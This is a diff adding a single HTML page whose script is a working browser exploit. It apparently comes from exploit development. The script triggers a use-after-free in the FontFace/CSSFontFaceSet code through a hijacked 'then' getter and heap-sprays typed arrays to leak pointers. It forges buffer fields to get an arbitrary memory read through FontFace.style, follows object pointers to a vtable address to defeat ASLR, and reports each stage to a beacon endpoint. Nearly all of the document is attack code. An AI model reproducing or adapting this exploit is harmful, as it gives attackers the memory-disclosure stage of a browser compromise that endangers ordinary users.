@@ -1,0 +1,250 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p691b</title></head>
+<body><pre id="out">p691b: direct VP read — no oracle, style-read only</pre>
+<script>
+'use strict';
+/*
+  p691b: Simplified FontFace VP leak — skip oracle, use style-read directly
+  -- prior art: p691 run2 got L1=0x10008c2590 L2=0x1000854380 but oracle dead
+  -- The style-read (forgeRead+face.style) can read arbitrary addresses
+     WITHOUT the oracle, as long as we set the right buffer fields
+  -- Strategy: UAF → spray → forgeRead(L1-0x10) → parse hash table →
+     forgeRead(WeakPtrImpl+8) → get CSSFontFaceSet* →
+     forgeRead(FO) → get VP
+
+  CRASH_CLASS: HIGH — style-read may crash if forge fields are wrong
+*/
+
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,d){
+  var msg='P691B-'+tag+(d!==undefined?'-'+String(d).slice(0,500):'');
+  say(msg);
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/P691B-'+encodeURIComponent(tag+(d!==undefined?'-'+String(d).slice(0,400):''))+'?t='+Date.now(),false);x.send(null);}catch(e){
+    try{new Image().src='/beacon/P691B-'+encodeURIComponent(msg.slice(0,200))+'?t='+Date.now();}catch(e2){}}
+}
+
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>>8)&0xFF;u[o+2]=(x>>>16)&0xFF;u[o+3]=(x>>>24)&0xFF;}
+function hex(x){return '0x'+x.toString(16);}
+
+function dec(s,lim){
+  var by=[],q=(s.charAt(0)==='"')?1:0,e=(s.slice(-1)==='"')?s.length-1:s.length,k=q;
+  while(k<e&&by.length<lim){var ch=s.charAt(k);
+    if(ch==='\\'){k++;var hh='';while(k<e&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k))){hh+=s.charAt(k);k++;}
+      if(hh.length===0){if(k<e){by.push(s.charCodeAt(k));k++;}}
+      else{if(s.charAt(k)===' ')k++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
+    else{by.push(s.charCodeAt(k));k++;}}
+  var h='';for(var j=0;j<by.length;j++)h+=('0'+by[j].toString(16)).slice(-2);return h;
+}
+function readLeHex(hexStr,off){
+  var s=hexStr.slice(off*2,off*2+16);
+  if(!/^[0-9a-f]{16}$/.test(s))return 0n;
+  return BigInt('0x'+s.match(/../g).reverse().join(''));
+}
+
+bk('START',navigator.userAgent);
+
+var SIZE=192, K=256, fired=false, faces=null;
+
+function start(){
+  var vf;
+  try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){bk('NOVF');return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}
+    try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SIZE));
+      w[0x82]=3;
+      w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em vf, v1','AB').then(function(f){
+    faces=f;
+    bk('RES','n'+f.length);
+    setTimeout(phase,100);
+  },function(e){bk('RJ',String(e&&e.name));});
+}
+
+function phase(){
+  /* Step 1: Find hit buffers */
+  var bufs=[], L1=0n, L2=0n;
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58), c=le(window.__sp[i],0x68);
+    if(a>0x1000000000n){
+      bufs.push(window.__sp[i]);
+      if(L1===0n){L1=a;L2=c;}
+    }
+  }
+  bk('L1',hex(L1));
+  bk('L2',hex(L2));
+  bk('HITS',bufs.length);
+  if(!bufs.length||L2===0n){bk('NOLEAK');return;}
+
+  /* Step 2: Find oracle face */
+  for(var i2=0;i2<bufs.length;i2++){bufs[i2][0]=2;put64(bufs[i2],0x08,L2);bufs[i2][0x10]=0;bufs[i2][0x82]=0;}
+  for(var i3=0;i3<faces.length;i3++){try{faces[i3].family='zz'+i3;}catch(e){}}
+  setTimeout(function(){
+    for(var i4=0;i4<faces.length;i4++){try{document.fonts.add(faces[i4]);}catch(e){}}
+    setTimeout(function(){
+      var fam=null,zi=-1;
+      for(var q=0;q<faces.length;q++){
+        try{if(document.fonts.check('1em zz'+q,'A')===false){fam='zz'+q;zi=q;break;}}catch(e){}
+      }
+      bk('FACE',fam+',zi='+zi);
+      if(zi<0){bk('NOFACE');return;}
+
+      /* Remove from font set BEFORE forgeRead (prevents layout interference) */
+      try{document.fonts.delete(faces[zi]);}catch(e){}
+
+      /* Step 3: Save snapshot, then do direct reads */
+      var snap=new Uint8Array(SIZE);
+      for(var s0=0;s0<SIZE;s0++)snap[s0]=bufs[0][s0];
+
+      function forgeForRead(daddr,dlen){
+        for(var ib=0;ib<bufs.length;ib++){
+          var vb=bufs[ib];
+          // Restore clean state first
+          for(var r0=0;r0<SIZE;r0++)vb[r0]=snap[r0];
+          // Set up style-read fields
+          put32(vb,0x30,4);put32(vb,0x34,dlen);put64(vb,0x38,daddr);put32(vb,0x40,4);
+          vb[0x44]=0x7A;vb[0x45]=0x7A;vb[0x46]=0x71;
+          put32(vb,0x70,4);
+          put32(vb,0x74,0x10);vb[0x78]=14;vb[0x79]=0;
+          // Use L1 as stand-in for self-dependent fields
+          put64(vb,0x7A,L1);
+          put32(vb,0x90,3);put32(vb,0x94,72);
+          put64(vb,0x98,L1);
+        }
+      }
+
+      function readStyle(){
+        try{return dec(String(faces[zi].style),128);}catch(e){return 'ERR:'+e.message.slice(0,30);}
+      }
+
+      function restore(){
+        for(var ib=0;ib<bufs.length;ib++){
+          for(var r0=0;r0<SIZE;r0++)bufs[ib][r0]=snap[r0];
+        }
+      }
+
+      /* ======== READ 1: Hash table (L1-0x10, 80 bytes) ======== */
+      bk('R1','reading hash table at '+hex(L1-0x10n));
+      forgeForRead(L1-0x10n,80);
+      var h1=readStyle();
+      restore();
+      bk('R1-LEN',h1.length);
+      bk('R1-DATA',h1.slice(0,80));
+      bk('R1-DATA2',h1.slice(80,160));
+
+      /* Parse hash table for bucket entries (WeakPtrImpl*) */
+      var IM=0n;
+      if(h1.length>=160){
+        // Hash table: metadata at -0x10 (16B prefix), then 8 buckets of 8 bytes each
+        // Buckets start at byte 16 of our read (L1-0x10+16 = L1)
+        for(var gb=2;gb<10;gb++){
+          var candidate=readLeHex(h1,gb*8);
+          if(candidate>0x1000000000n&&candidate<0xFFFFFFFFFFFFFFFFn){
+            IM=candidate;
+            bk('IM',hex(IM));
+            break;
+          }
+        }
+      }
+
+      if(IM===0n){
+        // Try reading at L1 directly (skip prefix)
+        bk('R1B','retry at L1');
+        forgeForRead(L1,64);
+        var h1b=readStyle();
+        restore();
+        bk('R1B-LEN',h1b.length);
+        bk('R1B-DATA',h1b.slice(0,64));
+        for(var gb2=0;gb2<8;gb2++){
+          var c2=readLeHex(h1b,gb2*8);
+          if(c2>0x1000000000n&&c2<0xFFFFFFFFFFFFFFFFn){
+            IM=c2;bk('IM',hex(IM));break;
+          }
+        }
+      }
+
+      if(IM===0n){bk('NOIM');bk('DONE','no IM');return;}
+
+      /* ======== READ 2: WeakPtrImpl at IM → m_ptr at +8 ======== */
+      bk('R2','reading WeakPtrImpl at '+hex(IM));
+      forgeForRead(IM,16);
+      var h2=readStyle();
+      restore();
+      bk('R2-LEN',h2.length);
+      bk('R2-DATA',h2.slice(0,32));
+
+      var FO=0n;
+      if(h2.length>=16){
+        FO=readLeHex(h2,8);  // m_ptr at +8 of WeakPtrImpl
+        if(FO===0n) FO=readLeHex(h2,0);  // try +0 as fallback
+        bk('FO',hex(FO));
+      }
+
+      if(FO===0n||FO<0x1000000000n){bk('NOFO');bk('DONE','no FO');return;}
+
+      /* ======== READ 3: CSSFontFaceSet at FO → vtable at +0 ======== */
+      bk('R3','reading CSSFontFaceSet at '+hex(FO));
+      forgeForRead(FO,32);
+      var h3=readStyle();
+      restore();
+      bk('R3-LEN',h3.length);
+      bk('R3-DATA',h3.slice(0,64));
+
+      var VP=0n;
+      if(h3.length>=16){
+        VP=readLeHex(h3,0);
+        bk('VP',hex(VP));
+        var low12=Number(VP&0xFFFn);
+        bk('VP-LOW12','0x'+low12.toString(16));
+      }
+
+      if(VP>0x100000000n){
+        bk('SUCCESS','VP='+hex(VP)+' low12=0x'+Number(VP&0xFFFn).toString(16));
+
+        /* ======== READ 4: vtable slots ======== */
+        bk('R4','reading vtable at '+hex(VP));
+        forgeForRead(VP,72);
+        var h4=readStyle();
+        restore();
+        bk('R4-LEN',h4.length);
+        bk('R4-DATA',h4.slice(0,80));
+        bk('R4-DATA2',h4.slice(80,144));
+
+        if(h4.length>=64){
+          for(var si=0;si<8;si++){
+            var slot=readLeHex(h4,si*8);
+            bk('VT'+si,hex(slot));
+          }
+        }
+      } else {
+        bk('NOVP');
+      }
+
+      bk('DONE','complete');
+    },60);
+  },60);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')
+  setTimeout(start,0);
+else
+  document.addEventListener('DOMContentLoaded',function(){setTimeout(start,0);});
+</script></body></html>
